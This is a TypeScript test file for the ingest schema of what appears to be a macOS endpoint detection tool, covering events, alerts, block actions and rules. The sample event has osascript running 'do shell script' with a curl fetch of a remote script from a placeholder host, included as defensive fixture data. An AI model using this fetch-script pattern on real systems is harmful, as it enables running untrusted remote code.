import { describe, expect, it } from 'vitest';
import { EventBody, IngestAck, IngestRequest, MAX_BATCH_RECORDS, newId } from './index.js';

const ts = 1_728_451_200_123;
const deviceId = 'laptop-7f3a9c2b';

const eventBody = {
  id: '9f2c1a4b3e5d7a01',
  ts,
  source: 'santa',
  kind: 'process.exec',
  process: {
    pid: 8421,
    path: '/usr/bin/osascript',
    args: ['-e', 'do shell script "curl -s https://example.invalid/x.sh"'],
    parentPath: '/bin/zsh',
    signing: 'unsigned',
    quarantine: { originUrl: 'https://example.invalid/x.zip' },
  },
};

const alertBody = {
  id: 'a11e0001c0de5f01',
  createdAt: ts,
  updatedAt: ts,
  ruleId: 'core.exec-script',
  ruleVersion: 3,
  title: 'Unsigned script launched from a download',
  summary: '/usr/bin/osascript ran a script quarantined from the internet.',
  severity: 'high',
  fidelity: 'medium',
  notify: 'popup',
  status: 'open',
  containment: 'active',
  eventIds: ['9f2c1a4b3e5d7a01'],
  actionIds: [],
  subject: { kind: 'process', label: 'osascript', path: '/usr/bin/osascript' },
  ai: {
    provider: 'openai',
    at: ts,
    verdict: 'suspicious',
    confidence: 0.72,
    summary: 'A quarantined script ran through osascript and contacted a new address.',
    proposalIds: [],
  },
  decision: {
    at: ts,
    verdict: 'malicious',
    remember: true,
    scope: 'this_binary',
    note: 'Kept out.',
  },
};

const actionBody = {
  id: '5c4d3e2f1a0b9f81',
  action: { kind: 'network.block', address: '203.0.113.7', port: 443 },
  actor: 'rule',
  alertId: 'a11e0001c0de5f01',
  ruleId: 'core.exec-script',
  reason: 'Blocked the address the script contacted.',
  requestedAt: ts,
  status: 'done',
  result: { at: ts, simulated: false },
};

const ruleBody = {
  id: 'persistence.unsigned-launch-agent',
  version: 2,
  name: 'Unsigned launch agent',
  description: 'An unsigned program added a launch agent or login item.',
  origin: 'builtin',
  mode: 'alert',
  severity: 'high',
  fidelity: 'medium',
  eventKinds: ['persistence'],
  condition: { field: 'process.signing', op: 'eq', value: 'unsigned' },
  exclusions: [{ field: 'path', op: 'startsWith', value: '/Applications/' }],
  reasons: ['An unsigned program added a launch agent.'],
  response: [],
  tags: ['T1543.001'],
  dedupe: { key: ['path'], windowSec: 300 },
  createdAt: ts,
  updatedAt: ts,
};

const batch = {
  v: 1 as const,
  deviceId,
  cursor: { ts, id: eventBody.id },
  records: [
    { r: 'event' as const, id: eventBody.id, ts, body: eventBody },
    { r: 'alert' as const, id: alertBody.id, ts, body: alertBody },
    { r: 'action' as const, id: actionBody.id, ts, body: actionBody },
    { r: 'rule' as const, id: ruleBody.id, version: ruleBody.version, body: ruleBody },
  ],
};

describe('IngestRequest', () => {
  it('round-trips a realistic batch of all four record kinds', () => {
    expect(IngestRequest.parse(batch)).toEqual(batch);
    expect(batch.records.map((r) => r.r)).toEqual(['event', 'alert', 'action', 'rule']);
  });

  it('rejects a missing or wrong wire version', () => {
    const { v: _v, ...withoutVersion } = batch;
    expect(IngestRequest.safeParse(withoutVersion).success).toBe(false);
    expect(IngestRequest.safeParse({ ...batch, v: 2 }).success).toBe(false);
  });

  it('rejects oversized and empty batches, and accepts the 500-record cap', () => {
    const exitAt = (i: number) => ({
      r: 'event' as const,
      id: newId(ts + i),
      ts: ts + i,
      body: {
        id: newId(ts + i),
        ts: ts + i,
        source: 'osquery',
        kind: 'process.exit',
        process: { pid: i, path: '/bin/true' },
      },
    });
    const full = Array.from({ length: MAX_BATCH_RECORDS }, (_, i) => exitAt(i));
    expect(IngestRequest.safeParse({ ...batch, records: full }).success).toBe(true);
    expect(
      IngestRequest.safeParse({ ...batch, records: [...full, exitAt(MAX_BATCH_RECORDS)] }).success,
    ).toBe(false);
    expect(IngestRequest.safeParse({ ...batch, records: [] }).success).toBe(false);
  });

  it('rejects unknown and missing record types', () => {
    expect(
      IngestRequest.safeParse({ ...batch, records: [{ r: 'gap', id: 'g1', ts, body: {} }] })
        .success,
    ).toBe(false);
    expect(
      IngestRequest.safeParse({ ...batch, records: [{ id: 'g1', ts, body: {} }] }).success,
    ).toBe(false);
  });

  it('rejects bad cursors', () => {
    const bad = [
      { ts: -1, id: 'c1' },
      { ts: 1.5, id: 'c1' },
      { ts: 0, id: '' },
      { ts: 0, id: 'c'.repeat(129) },
      { ts: 0 },
      {},
    ];
    for (const cursor of bad) {
      expect(IngestRequest.safeParse({ ...batch, cursor }).success).toBe(false);
    }
  });

  it('rejects device ids outside 8..64 characters', () => {
    expect(IngestRequest.safeParse({ ...batch, deviceId: 'dev1' }).success).toBe(false);
    expect(IngestRequest.safeParse({ ...batch, deviceId: 'd'.repeat(65) }).success).toBe(false);
    expect(IngestRequest.safeParse({ ...batch, deviceId: 'd'.repeat(8) }).success).toBe(true);
    expect(IngestRequest.safeParse({ ...batch, deviceId: 'd'.repeat(64) }).success).toBe(true);
  });

  it('rejects records that are not real events, alerts or envelopes', () => {
    const record = { ...batch.records[0]! };
    // A body without `source` is not a sensor event.
    expect(
      IngestRequest.safeParse({
        ...batch,
        records: [{ ...record, body: { id: 'e1', ts, kind: 'process.exec' } }],
      }).success,
    ).toBe(false);
    // An unknown event kind is not one either.
    expect(
      IngestRequest.safeParse({
        ...batch,
        records: [
          { ...record, body: { id: 'e1', ts, source: 'osquery', kind: 'nope', process: {} } },
        ],
      }).success,
    ).toBe(false);
    // An alert body missing its required fields.
    expect(
      IngestRequest.safeParse({ ...batch, records: [{ ...record, r: 'alert', body: {} }] }).success,
    ).toBe(false);
    // Envelope gaps: no id on the record, no version on the rule.
    expect(
      IngestRequest.safeParse({ ...batch, records: [{ r: 'event', ts, body: eventBody }] }).success,
    ).toBe(false);
    expect(
      IngestRequest.safeParse({
        ...batch,
        records: [{ r: 'rule', id: 'persistence.unsigned-launch-agent', body: ruleBody }],
      }).success,
    ).toBe(false);
    // A rule version must be a positive integer.
    expect(
      IngestRequest.safeParse({
        ...batch,
        records: [
          { r: 'rule', id: 'persistence.unsigned-launch-agent', version: 0, body: ruleBody },
        ],
      }).success,
    ).toBe(false);
  });
});

describe('EventBody', () => {
  it('strips raw sensor payloads at the boundary', () => {
    const parsed = EventBody.parse({ ...eventBody, raw: { santaLine: 'typeof=EXEC ...' } });
    expect(parsed).toEqual(eventBody);
    expect('raw' in parsed).toBe(false);
  });
});

describe('IngestAck', () => {
  it('round-trips and rejects bad counts, cursors or version', () => {
    const ack = {
      v: 1 as const,
      accepted: 3,
      duplicates: 1,
      ackedCursor: { ts, id: eventBody.id },
    };
    expect(IngestAck.parse(ack)).toEqual(ack);
    expect(IngestAck.safeParse({ ...ack, accepted: -1 }).success).toBe(false);
    expect(IngestAck.safeParse({ ...ack, accepted: 1.5 }).success).toBe(false);
    expect(IngestAck.safeParse({ ...ack, duplicates: -1 }).success).toBe(false);
    expect(IngestAck.safeParse({ ...ack, ackedCursor: { ts, id: '' } }).success).toBe(false);
    const { v: _v, ...withoutVersion } = ack;
    expect(IngestAck.safeParse(withoutVersion).success).toBe(false);
  });
});
